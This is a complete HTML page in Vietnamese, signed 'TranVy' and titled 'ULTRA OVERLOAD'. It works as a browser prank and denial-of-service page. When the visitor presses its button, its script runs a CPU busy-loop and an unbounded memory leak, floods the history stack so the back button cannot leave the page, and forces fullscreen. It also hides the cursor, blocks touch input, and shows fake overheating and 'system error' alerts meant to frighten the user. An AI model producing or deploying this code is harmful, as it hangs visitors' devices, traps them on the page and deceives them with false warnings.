<!DOCTYPE html>
<html lang="vi" class="h-full overflow-hidden">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>CẢNH BÁO TỐI CAO - TranVy Cloud</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root {
            --danger: #ef4444;
            --angle: 0deg;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            width: 100vw;
            height: 100dvh; 
            overflow: hidden;
            touch-action: none;
            user-select: none;
            -webkit-user-select: none;
            position: fixed;
        }

        body.locked, body.locked * {
            cursor: none !important;
            touch-action: none !important;
        }

        .glass-card {
            background: rgba(5, 5, 5, 0.95);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 0, 0, 0.2);
            border-radius: 30px;
            box-shadow: 0 0 80px rgba(255, 0, 0, 0.3);
            z-index: 100;
        }

        .neon-border {
            position: absolute;
            inset: -2px;
            border-radius: 30px;
            padding: 2px;
            background: conic-gradient(from var(--angle), #ff0000, transparent, #ff0000, transparent, #ff0000);
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            animation: rotate 1.2s linear infinite;
        }

        @keyframes rotate { to { --angle: 360deg; } }
        @property --angle { syntax: '<angle>'; initial-value: 0deg; inherits: false; }

        .glitch-fast { animation: glitch 0.04s infinite; }
        @keyframes glitch {
            0% { transform: translate(3px, 1px); filter: brightness(1.5); }
            50% { transform: translate(-3px, -1px); filter: hue-rotate(270deg) invert(1); }
            100% { transform: translate(0); }
        }

        #terminal {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.95);
            z-index: 200;
            padding: 20px;
            font-family: 'Fira Code', monospace;
            color: #ff0000;
            font-size: 9px;
            pointer-events: none;
            overflow: hidden;
        }

        #fake-alert {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 85%;
            background: #0a0a0a;
            border: 3px solid #ff0000;
            padding: 25px;
            z-index: 5000;
            text-align: center;
            box-shadow: 0 0 100px #ff0000;
            animation: pulse-red 1s infinite;
        }

        @keyframes pulse-red {
            0%, 100% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(-50%, -50%) scale(1.05); }
        }

        .creator-tag {
            font-family: 'Fira Code', monospace;
            text-shadow: 0 0 10px #ff0000;
        }
    </style>
</head>
<body class="flex items-center justify-center p-6" oncontextmenu="return false;">
    <div id="matrix-container" class="fixed inset-0 opacity-20">
        <canvas id="matrix"></canvas>
    </div>
    
    <div id="terminal"></div>
    <div id="fake-alert">
        <h2 class="text-red-600 font-black text-xl mb-2">LỖI HỆ THỐNG TỐI CAO</h2>
        <p class="text-[10px] text-gray-400 mb-4">Hệ thống đã sẵn sàng thực thi. Mọi nỗ lực thoát đều khiến CPU bị ép xung lên mức tối đa.</p>
        <div class="py-2 px-6 bg-red-600 text-white text-xs font-black animate-pulse">ĐANG KHÓA CẢM ỨNG</div>
    </div>

    <div id="main-content" class="glass-card w-full max-w-md p-1 relative">
        <div class="neon-border"></div>
        <div class="bg-black/95 rounded-[28px] p-8 text-center relative z-10">
            <!-- Creator Tag -->
            <div class="absolute top-4 right-6 creator-tag text-[10px] font-bold text-red-500/80 tracking-widest uppercase">
                Created by TranVy
            </div>

            <div class="mb-6 inline-block p-4 rounded-full bg-red-600/20 border border-red-600 animate-bounce">
                <svg class="w-12 h-12 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
            </div>

            <h1 class="text-3xl font-black text-red-600 uppercase tracking-tighter mb-1 italic">ULTRA OVERLOAD</h1>
            <p class="text-[9px] text-red-500 font-bold mb-6 tracking-widest opacity-70">SYSTEM VULNERABILITY EXPLOIT</p>
            
            <p id="status" class="text-[10px] text-white/50 tracking-[0.3em] uppercase mb-6">Tài nguyên đã sẵn sàng...</p>

            <div id="device-info" class="bg-red-900/10 border border-red-600/30 rounded-2xl p-4 mb-4 text-left font-mono text-[9px] space-y-1">
                <div class="flex justify-between"><span>CORE TEMP:</span> <span id="temp-val" class="text-red-500">32°C</span></div>
                <div class="flex justify-between"><span>CPU USAGE:</span> <span id="cpu-val" class="text-green-500">LOW</span></div>
                <div class="flex justify-between"><span>BACKGROUND STRESS:</span> <span id="bg-val" class="text-gray-500">INACTIVE</span></div>
            </div>

            <button id="lock-btn" class="w-full py-5 bg-red-600 hover:bg-red-700 text-white font-black rounded-2xl shadow-[0_0_40px_rgba(220,38,38,0.6)] transition-all uppercase tracking-widest text-sm">
                BẮT ĐẦU OVERLOAD
            </button>

            <p class="mt-6 text-[8px] text-red-600/40 uppercase font-bold">Cảnh báo: Máy sẽ đơ ngay khi ấn</p>
        </div>
    </div>

    <script>
        const btn = document.getElementById('lock-btn');
        const terminal = document.getElementById('terminal');
        const fakeAlert = document.getElementById('fake-alert');
        
        let isLocked = false;
        let blockIntensity = 0;

        // 1. Công cụ gây lag ngầm
        function backgroundStress() {
            if (!isLocked) return;
            const start = Date.now();
            while (Date.now() - start < blockIntensity) {
                for(let i=0; i<500; i++) { Math.atan2(Math.random(), Math.random()); }
            }
            setTimeout(backgroundStress, 1);
        }

        // 2. Gây lag bộ nhớ ngầm
        let memoryLeaker = [];
        function leakMemory() {
            if (!isLocked) return;
            try {
                for (let i = 0; i < 50; i++) {
                    memoryLeaker.push(new Array(500).fill("LAG_DATA_" + Math.random()));
                }
                if (memoryLeaker.length > 3000) memoryLeaker.splice(0, 300);
            } catch(e) {}
            setTimeout(leakMemory, 200);
        }

        // 3. Cơ chế tự động kích hoạt lại khi quay lại app
        document.addEventListener('visibilitychange', () => {
            if (isLocked && document.visibilityState === 'visible') {
                blockIntensity = 180; 
                showLog("HỆ THỐNG PHÁT HIỆN TRUY CẬP LẠI: TĂNG CƯỜNG KHÓA...");
                document.body.classList.add('glitch-fast');
            }
        });

        // 4. Chống thoát bằng History API
        function lockHistory() {
            try {
                for(let i=0; i<5; i++) {
                    window.history.pushState({locked: true}, "", "#overload-active-" + Date.now());
                }
            } catch(e) {}
        }

        // 5. Fix lỗi Permission Policy cho Fullscreen
        function attemptFullscreen() {
            if(!isLocked) return;
            try {
                const doc = document.documentElement;
                const requestMethod = doc.requestFullscreen || doc.webkitRequestFullscreen || doc.mozRequestFullScreen || doc.msRequestFullscreen;
                if (requestMethod) {
                    requestMethod.call(doc).catch(err => {
                        console.log("Fullscreen bị chặn.");
                    });
                }
            } catch(e) {}
        }

        // UI Updates
        function showLog(msg) {
            const l = document.createElement('div');
            l.innerText = `[${new Date().toLocaleTimeString()}] > ${msg}`;
            terminal.appendChild(l);
            if(terminal.childNodes.length > 30) terminal.removeChild(terminal.firstChild);
        }

        // Matrix Background
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        let drops = [];
        function initMatrix() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            for(let i=0; i<canvas.width/15; i++) drops[i] = 1;
        }
        function drawMatrix() {
            ctx.fillStyle = "rgba(0,0,0,0.15)";
            ctx.fillRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = isLocked ? "#ff0000" : "#220000";
            ctx.font = "12px monospace";
            for(let i=0; i<drops.length; i++) {
                ctx.fillText(String.fromCharCode(0x30A0 + Math.random() * 96), i*15, drops[i]*15);
                if(drops[i]*15 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        initMatrix();
        setInterval(drawMatrix, 50);

        // Kích hoạt
        btn.onclick = (e) => {
            e.preventDefault();
            isLocked = true;
            blockIntensity = 95; 

            document.body.classList.add('locked', 'glitch-fast');
            btn.innerText = "SYSTEM OVERLOADED";
            btn.disabled = true;
            terminal.style.display = 'block';
            
            document.getElementById('cpu-val').innerText = "MAX_LOAD";
            document.getElementById('cpu-val').className = "text-red-600";
            document.getElementById('bg-val').innerText = "STRESSING";
            document.getElementById('bg-val').className = "text-red-500";

            backgroundStress();
            leakMemory();
            lockHistory();
            attemptFullscreen();

            // Tăng nhiệt độ giả lập
            let temp = 35;
            setInterval(() => {
                temp += Math.random() * 2;
                if(temp > 108) temp = 108;
                document.getElementById('temp-val').innerText = Math.floor(temp) + "°C";
            }, 400);

            setTimeout(() => {
                fakeAlert.style.display = 'block';
                blockIntensity = 150; 
            }, 2500);

            window.addEventListener('popstate', () => {
                lockHistory();
                showLog("CẢNH BÁO: KHÔNG THỂ THOÁT TRONG KHI ĐANG OVERLOAD.");
            });
        };

        document.addEventListener('click', attemptFullscreen);
        document.addEventListener('touchstart', attemptFullscreen);
        window.addEventListener('resize', initMatrix);
    </script>
</body>
</html>